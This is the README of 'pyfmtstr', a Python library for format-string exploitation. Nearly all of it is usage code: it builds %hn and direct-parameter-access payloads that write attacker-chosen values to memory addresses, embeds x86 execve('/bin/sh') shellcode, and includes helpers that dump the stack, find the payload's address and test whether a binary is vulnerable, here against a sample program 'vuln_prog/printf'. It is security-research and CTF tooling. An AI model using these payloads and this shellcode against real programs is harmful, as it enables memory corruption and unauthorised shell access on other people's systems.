# pyfmtstr

format string exploitation library by cloud

This library shamelessly rips code from a bunch of existing libraries:
* postmodern - Ronin FormatString Helper
* Paul Haas - Defcon 18 Auto Format Brute Forcer
* hellman - libformatstr
* jduck - Metasploit FormatString Mixin

I just reoganized/combined things in a way that I prefer.

# Usage

### Generate simple fmtstr using %hn and DPA

```
from pyfmtstr import pyfmtstr,membuf
m = membuf()
m[0x080494d4] = 0xbfffddd8
f = pyfmtstr(membuf=m)
sys.stdout.write(f.generate_fmtstr())
```

### Generate fmtstr using customized options

```
from pyfmtstr import pyfmtstr,membuf
m = membuf()
m[0x080494d4] = 0xbfffddd8
f = pyfmtstr(membuf=m, num_pops=1, pad_bytes=2, printed_bytes=50)
f.set_caps(fpu=False, hn=True, dpa=True)
sys.stdout.write(f.generate_fmtstr())
```

### Dynamically guess offsets

```
from pyfmtstr import exploit
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
     "\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
e = exploit(binary="vuln_prog/printf", shellcode=sc)
sc_offset,sc_align  = e.dump_stack()
fmtstr_addr,sc_addr = e.find_fmtstr_address()
```

### Random helper functions 

```
from pyfmtstr import exploit
e = exploit(binary="vuln_prog/printf", shellcode=sc)
e.detect_caps()
e.detect_vulnerable()
e.stack_read(offset=1)
```

### Define your own custom trigger/parsing functions

```
def trigger_fmtstr(fmtstr):
    return fmtstr

def extract_fmtstr_output(output):
    return output

from pyfmtstr import exploit
e = exploit(binary="vuln_prog/printf")
e.trigger_fmtstr = trigger_fmtstr
e.extract_fmtstr_output = extract_fmtstr_output
fmtstr_addr,sc_addr = e.find_fmtstr_address()
```
